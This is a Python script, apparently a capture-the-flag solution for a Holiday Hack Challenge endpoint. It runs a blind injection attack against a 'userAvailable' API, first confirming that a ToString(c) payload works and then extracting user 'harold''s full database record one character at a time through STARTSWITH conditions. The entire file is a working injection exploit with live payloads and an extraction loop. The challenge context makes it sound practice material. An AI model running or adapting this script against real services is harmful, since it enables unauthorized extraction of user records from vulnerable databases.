import requests
import string
import sys
import urllib.parse

# Configuration
RESOURCE_ID = "911320d0-4305-4125-bbb0-60be5837edcc"
TARGET_URL = f"https://hhc25-smartgnomehack-prod.holidayhackchallenge.com/userAvailable?id={RESOURCE_ID}&username="

print(f"[*] Targeting Oracle: {TARGET_URL}")

def check_payload(payload):
    encoded = urllib.parse.quote(payload)
    try:
        r = requests.get(TARGET_URL + encoded)
        # "available": false -> TRUE (Condition Met)
        return '"available":false' in r.text.lower()
    except:
        return False

print("\n[*] Phase 1: Verifying ToString(c) capability...")

# Payload: " OR CONTAINS(ToString(c), "username") AND "1"="1
# We verify if we can convert the doc to string and find the known field "username"
verify_payload = '" OR CONTAINS(ToString(c), "username") AND "1"="1'

if check_payload(verify_payload):
    print("    [+] Success! ToString(c) is enabled. We can dump the whole JSON.")
else:
    print("    [-] Failed. ToString(c) might be blocked or not supported.")
    sys.exit()

print("\n[*] Phase 2: Extracting Full Document for 'harold'")
# We will iterate through valid JSON characters to reconstruct the string.
extracted_json = ""
# JSON-specific charset (Quotes, braces, colons are important)
charset = ' "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-!@?#$%,.:'

# Safety break to prevent infinite loops
MAX_LEN = 300 

while len(extracted_json) < MAX_LEN:
    found = False
    for char in charset:
        test_str = extracted_json + char
        
        # We target 'harold' specifically to get his record
        # Query: " OR (c.username='harold' AND STARTSWITH(ToString(c), "EXTRACTED...")) AND "1"="1
        
        # Note: We need to escape single quotes in our test string for the SQL query
        safe_test_str = test_str.replace("'", "\\'") 
        
        condition = f"(c.username='harold' AND STARTSWITH(ToString(c), '{safe_test_str}'))"
        payload = f'" OR {condition} AND "1"="1'
        
        sys.stdout.write(f"\r    Current: {test_str}")
        sys.stdout.flush()
        
        if check_payload(payload):
            extracted_json += char
            found = True
            break
            
    if not found:
        print(f"\n[+] Extraction Complete (or paused).")
        break

print(f"\n\n[*] Recovered JSON Document:\n{extracted_json}")
